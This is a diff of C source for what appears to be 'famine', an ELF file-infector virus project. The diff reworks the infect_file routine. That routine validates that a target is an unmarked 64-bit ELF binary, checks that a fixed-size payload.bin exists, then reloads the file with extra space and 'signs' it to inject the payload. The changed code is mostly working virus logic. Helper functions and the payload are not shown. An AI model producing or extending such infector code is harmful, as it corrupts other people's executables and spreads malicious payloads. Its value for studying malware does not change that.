@@ -1,11 +1,8 @@
 #include "famine.h"
 #include <dirent.h>
 #include <elf.h>
-#include <fcntl.h>
 #include <stdio.h>
-#include <sys/mman.h>
 #include <sys/stat.h>
-#include <unistd.h>
 
 #ifndef PATH_MAX
 # define PATH_MAX 4096
@@ -22,35 +19,60 @@ static int  is_dot_entry(const char *name)
     return 0;
 }
 
+static int  is_elf64(t_file file)
+{
+    Elf64_Ehdr  *ehdr;
+
+    if (file.head == MAP_FAILED || file.size < sizeof(Elf64_Ehdr))
+        return 0;
+    ehdr = (Elf64_Ehdr *)file.head;
+    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
+        return 0;
+    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
+        return 0;
+    if (ehdr->e_phoff > file.size || ehdr->e_phentsize != sizeof(Elf64_Phdr))
+        return 0;
+    if (ehdr->e_phnum > (file.size - ehdr->e_phoff) / sizeof(Elf64_Phdr))
+        return 0;
+    if (last_phdr(file.head) == NULL)
+        return 0;
+    return 1;
+}
+
+static int  payload_available(void)
+{
+    struct stat st;
+
+    if (lstat("payload.bin", &st) < 0)
+        return 0;
+    if (!S_ISREG(st.st_mode) || st.st_size != PAYLOAD_BIN_SIZE)
+        return 0;
+    return 1;
+}
+
 static void infect_file(const char *path)
 {
-    int         fd;
     struct stat st;
-    char        *adress;
+    t_file      target;
 
-    fd = open(path, O_RDWR);
-    if (fd < 0)
+    if (lstat(path, &st) < 0)
         return;
-    if (fstat(fd, &st) < 0)
-    {
-        close(fd);
-        return;
-    }
     if (!S_ISREG(st.st_mode) || st.st_size < (off_t)sizeof(Elf64_Ehdr))
+        return;
+    target = file_load(path, 0);
+    if (!is_elf64(target) || is_signed(target))
     {
-        close(fd);
+        file_unload(target);
         return;
     }
-    adress = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-    if (adress == MAP_FAILED)
-    {
-        close(fd);
+    file_unload(target);
+    if (!payload_available())
         return;
-    }
-    if (is_signed(adress, st.st_size) == 0 && sign_file(adress, st.st_size) != 0)
-        msync(adress, st.st_size, MS_SYNC);
-    munmap(adress, st.st_size);
-    close(fd);
+    target = file_load(path, PAYLOAD_BIN_SIZE);
+    if (is_elf64(target))
+        sign(target);
+    else
+        file_unload(target);
 }
 
 static void scan_directory(const char *dirname)
